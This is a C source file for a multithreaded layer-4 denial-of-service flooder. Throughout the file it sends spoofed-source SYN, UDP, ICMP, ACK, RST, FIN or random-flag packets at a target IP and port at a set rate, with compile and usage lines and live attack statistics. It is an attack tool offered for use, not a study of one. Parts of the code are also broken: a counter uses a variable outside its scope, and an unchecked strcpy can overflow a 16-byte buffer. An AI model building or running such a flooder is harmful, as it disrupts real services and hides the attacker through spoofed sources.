// modern_flooder.c - Layer 4 DDoS Tool (SYN/UDP/ICMP/ACK/RST/FIN)
// Compile: gcc -O3 -pthread -o flooder modern_flooder.c
// Usage: ./flooder -t TARGET_IP -p PORT -d DURATION -c THREADS -r PPS -m MODE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>

#define MAX_PACKET_SIZE 65536
#define STATS_INTERVAL_SEC 1

// Global flags
volatile int running = 1;
unsigned long long total_packets = 0;
unsigned long long total_bytes = 0;
unsigned long long pps_counter = 0;
unsigned long long current_pps = 0;
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// Attack parameters
char target_ip[16];
int target_port;
int duration_sec;
int thread_count;
int target_pps;          // packets per second per thread (total = thread_count * target_pps)
int attack_mode;         // 0=SYN, 1=UDP, 2=ICMP, 3=ACK, 4=RST, 5=FIN, 6=RANDOM_FLAGS

// Random generator (fast, thread-safe)
unsigned int xorshift32(unsigned int *state) {
    unsigned int x = *state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    *state = x;
    return x;
}

// Random IP for spoofing (class A/B/C)
unsigned int random_ip(unsigned int *rng) {
    unsigned int octet1 = (xorshift32(rng) % 224) + 1; // 1..224 avoid multicast
    if (octet1 == 127) octet1 = 10; // avoid loopback
    unsigned int octet2 = xorshift32(rng) % 256;
    unsigned int octet3 = xorshift32(rng) % 256;
    unsigned int octet4 = (xorshift32(rng) % 254) + 1;
    return (octet1 << 24) | (octet2 << 16) | (octet3 << 8) | octet4;
}

// Checksum (16-bit one's complement)
unsigned short in_cksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1)
        sum += *(unsigned char *)ptr;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Pseudo header for TCP/UDP checksum
struct pseudo_tcp {
    unsigned int saddr;
    unsigned int daddr;
    unsigned char reserved;
    unsigned char protocol;
    unsigned short tcp_len;
};

// Build TCP packet (SYN, ACK, RST, FIN, or random)
void build_tcp_packet(unsigned char *buffer, unsigned int src_ip, unsigned int dst_ip,
                      unsigned short src_port, unsigned short dst_port, unsigned int seq,
                      unsigned int ack_seq, int flags, int payload_len) {
    struct iphdr *ip = (struct iphdr *)buffer;
    struct tcphdr *tcp = (struct tcphdr *)(buffer + sizeof(struct iphdr));
    unsigned char *data = buffer + sizeof(struct iphdr) + sizeof(struct tcphdr);

    // IP header
    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    ip->id = htons(rand() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_TCP;
    ip->check = 0;
    ip->saddr = src_ip;
    ip->daddr = dst_ip;
    ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

    // TCP header
    tcp->source = htons(src_port);
    tcp->dest = htons(dst_port);
    tcp->seq = htonl(seq);
    tcp->ack_seq = htonl(ack_seq);
    tcp->doff = 5;  // 5*4=20 bytes header
    tcp->res1 = 0;
    tcp->cwr = 0;
    tcp->ece = 0;
    tcp->urg = 0;
    tcp->ack = (flags & 0x10) ? 1 : 0;
    tcp->psh = (flags & 0x08) ? 1 : 0;
    tcp->rst = (flags & 0x04) ? 1 : 0;
    tcp->syn = (flags & 0x02) ? 1 : 0;
    tcp->fin = (flags & 0x01) ? 1 : 0;
    tcp->window = htons(64240);
    tcp->check = 0;
    tcp->urg_ptr = 0;

    // Payload (random bytes)
    for (int i = 0; i < payload_len; i++) {
        data[i] = rand() & 0xFF;
    }

    // Pseudo header for TCP checksum
    struct pseudo_tcp psh;
    psh.saddr = src_ip;
    psh.daddr = dst_ip;
    psh.reserved = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_len = htons(sizeof(struct tcphdr) + payload_len);
    unsigned char *pseudogram = malloc(sizeof(struct pseudo_tcp) + sizeof(struct tcphdr) + payload_len);
    memcpy(pseudogram, &psh, sizeof(struct pseudo_tcp));
    memcpy(pseudogram + sizeof(struct pseudo_tcp), tcp, sizeof(struct tcphdr) + payload_len);
    tcp->check = in_cksum((unsigned short *)pseudogram, sizeof(struct pseudo_tcp) + sizeof(struct tcphdr) + payload_len);
    free(pseudogram);
}

// Build UDP packet
void build_udp_packet(unsigned char *buffer, unsigned int src_ip, unsigned int dst_ip,
                      unsigned short src_port, unsigned short dst_port, int payload_len) {
    struct iphdr *ip = (struct iphdr *)buffer;
    struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));
    unsigned char *data = buffer + sizeof(struct iphdr) + sizeof(struct udphdr);

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
    ip->id = htons(rand() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = src_ip;
    ip->daddr = dst_ip;
    ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

    udp->source = htons(src_port);
    udp->dest = htons(dst_port);
    udp->len = htons(sizeof(struct udphdr) + payload_len);
    udp->check = 0;

    for (int i = 0; i < payload_len; i++) {
        data[i] = rand() & 0xFF;
    }
}

// Build ICMP Echo Request
void build_icmp_packet(unsigned char *buffer, unsigned int src_ip, unsigned int dst_ip, int payload_len) {
    struct iphdr *ip = (struct iphdr *)buffer;
    struct icmphdr *icmp = (struct icmphdr *)(buffer + sizeof(struct iphdr));
    unsigned char *data = buffer + sizeof(struct iphdr) + sizeof(struct icmphdr);

    ip->ihl = 5;
    ip->version = 4;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_len);
    ip->id = htons(rand() & 0xFFFF);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_ICMP;
    ip->check = 0;
    ip->saddr = src_ip;
    ip->daddr = dst_ip;
    ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->checksum = 0;
    icmp->un.echo.id = htons(rand() & 0xFFFF);
    icmp->un.echo.sequence = htons(rand() & 0xFFFF);

    for (int i = 0; i < payload_len; i++) {
        data[i] = rand() & 0xFF;
    }

    // ICMP checksum covers header + payload
    unsigned short *icmp_ptr = (unsigned short *)icmp;
    int icmp_len = sizeof(struct icmphdr) + payload_len;
    icmp->checksum = in_cksum(icmp_ptr, icmp_len);
}

// Attack thread
void *attack_worker(void *arg) {
    int thread_id = *(int *)arg;
    free(arg);
    unsigned int rng_state = time(NULL) ^ (thread_id * 1234567);
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket raw");
        pthread_exit(NULL);
    }
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(sock);
        pthread_exit(NULL);
    }

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &dest.sin_addr);

    // Rate limiting: token bucket
    int packet_interval_us = (target_pps > 0) ? (1000000 / target_pps) : 0;
    struct timespec next_time;
    clock_gettime(CLOCK_MONOTONIC, &next_time);

    unsigned char packet[MAX_PACKET_SIZE];
    int payload_len = (attack_mode == 1 || attack_mode == 2) ? 1400 : 0; // UDP/ICMP use large payload
    if (attack_mode == 1) payload_len = 1400;   // UDP
    if (attack_mode == 2) payload_len = 1400;   // ICMP
    if (attack_mode == 0) payload_len = 0;      // SYN

    while (running) {
        unsigned int src_ip = random_ip(&rng_state);
        unsigned short src_port = xorshift32(&rng_state) % 65535 + 1;
        unsigned int seq = xorshift32(&rng_state);
        unsigned int ack_seq = xorshift32(&rng_state);

        int flags;
        switch (attack_mode) {
            case 0: flags = 0x02; break; // SYN
            case 3: flags = 0x10; break; // ACK
            case 4: flags = 0x04; break; // RST
            case 5: flags = 0x01; break; // FIN
            case 6: flags = (xorshift32(&rng_state) & 0x1F); break; // random flags
            default: flags = 0x02;
        }

        if (attack_mode == 0 || attack_mode == 3 || attack_mode == 4 || attack_mode == 5 || attack_mode == 6) {
            // TCP flood
            build_tcp_packet(packet, src_ip, dest.sin_addr.s_addr, src_port, target_port,
                             seq, ack_seq, flags, payload_len);
            int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len;
            sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        } else if (attack_mode == 1) {
            // UDP flood
            build_udp_packet(packet, src_ip, dest.sin_addr.s_addr, src_port, target_port, payload_len);
            int packet_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len;
            sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        } else if (attack_mode == 2) {
            // ICMP flood
            build_icmp_packet(packet, src_ip, dest.sin_addr.s_addr, payload_len);
            int packet_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_len;
            sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        }

        // Update counters atomically
        pthread_mutex_lock(&stats_mutex);
        total_packets++;
        total_bytes += packet_len;
        pps_counter++;
        pthread_mutex_unlock(&stats_mutex);

        // Rate limiting
        if (target_pps > 0) {
            next_time.tv_nsec += packet_interval_us * 1000;
            if (next_time.tv_nsec >= 1000000000) {
                next_time.tv_sec++;
                next_time.tv_nsec -= 1000000000;
            }
            clock_nanosleep(CLOCK_MONOTONIC, TIMER_ABSTIME, &next_time, NULL);
        }
    }
    close(sock);
    return NULL;
}

// Statistics reporter thread
void *stats_reporter(void *arg) {
    unsigned long long last_packets = 0;
    time_t start = time(NULL);
    while (running) {
        sleep(STATS_INTERVAL_SEC);
        pthread_mutex_lock(&stats_mutex);
        unsigned long long now_packets = total_packets;
        unsigned long long now_bytes = total_bytes;
        unsigned long long pps = pps_counter;
        pps_counter = 0;
        pthread_mutex_unlock(&stats_mutex);

        current_pps = pps;
        time_t elapsed = time(NULL) - start;
        printf("\r[%02d:%02d] PPS: %7llu | Total Pkts: %11llu | Total MB: %5.2f | Mode: %d     ",
               (int)(elapsed/60), (int)(elapsed%60), pps, now_packets, (double)now_bytes/(1024*1024), attack_mode);
        fflush(stdout);
    }
    return NULL;
}

void signal_handler(int sig) {
    running = 0;
}

void print_usage(char *prog) {
    fprintf(stderr, "Usage: %s -t TARGET_IP -p PORT -d DURATION -c THREADS -r PPS -m MODE\n", prog);
    fprintf(stderr, "MODE: 0=SYN, 1=UDP, 2=ICMP, 3=ACK, 4=RST, 5=FIN, 6=RANDOM_FLAGS\n");
    fprintf(stderr, "Example: %s -t 192.168.1.1 -p 80 -d 60 -c 10 -r 10000 -m 0\n", prog);
    exit(1);
}

int main(int argc, char **argv) {
    if (geteuid() != 0) {
        fprintf(stderr, "Root privileges required for raw sockets.\n");
        return 1;
    }

    // Defaults
    target_port = 80;
    duration_sec = 60;
    thread_count = 4;
    target_pps = 10000;   // per thread
    attack_mode = 0;

    int opt;
    while ((opt = getopt(argc, argv, "t:p:d:c:r:m:")) != -1) {
        switch (opt) {
            case 't': strcpy(target_ip, optarg); break;
            case 'p': target_port = atoi(optarg); break;
            case 'd': duration_sec = atoi(optarg); break;
            case 'c': thread_count = atoi(optarg); break;
            case 'r': target_pps = atoi(optarg); break;
            case 'm': attack_mode = atoi(optarg); break;
            default: print_usage(argv[0]);
        }
    }
    if (target_ip[0] == 0) print_usage(argv[0]);

    signal(SIGINT, signal_handler);

    printf("[+] Starting Layer 4 Flood\n");
    printf("    Target: %s:%d\n", target_ip, target_port);
    printf("    Duration: %d sec\n", duration_sec);
    printf("    Threads: %d\n", thread_count);
    printf("    PPS limit per thread: %d (total ~%d pps)\n", target_pps, target_pps * thread_count);
    printf("    Mode: ");
    switch(attack_mode) {
        case 0: printf("SYN\n"); break;
        case 1: printf("UDP (payload 1400)\n"); break;
        case 2: printf("ICMP (payload 1400)\n"); break;
        case 3: printf("ACK\n"); break;
        case 4: printf("RST\n"); break;
        case 5: printf("FIN\n"); break;
        case 6: printf("RANDOM TCP flags\n"); break;
    }

    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, stats_reporter, NULL);

    pthread_t workers[thread_count];
    for (int i = 0; i < thread_count; i++) {
        int *id = malloc(sizeof(int));
        *id = i;
        pthread_create(&workers[i], NULL, attack_worker, id);
    }

    sleep(duration_sec);
    running = 0;

    for (int i = 0; i < thread_count; i++) {
        pthread_join(workers[i], NULL);
    }
    pthread_join(stats_thread, NULL);

    printf("\n\n[+] Attack finished. Final stats:\n");
    printf("    Total packets sent: %llu\n", total_packets);
    printf("    Total data: %.2f MB\n", (double)total_bytes/(1024*1024));
    printf("    Average PPS: %.2f\n", (double)total_packets / duration_sec);
    printf("    Peak PPS: %llu\n", current_pps);
    return 0;
}
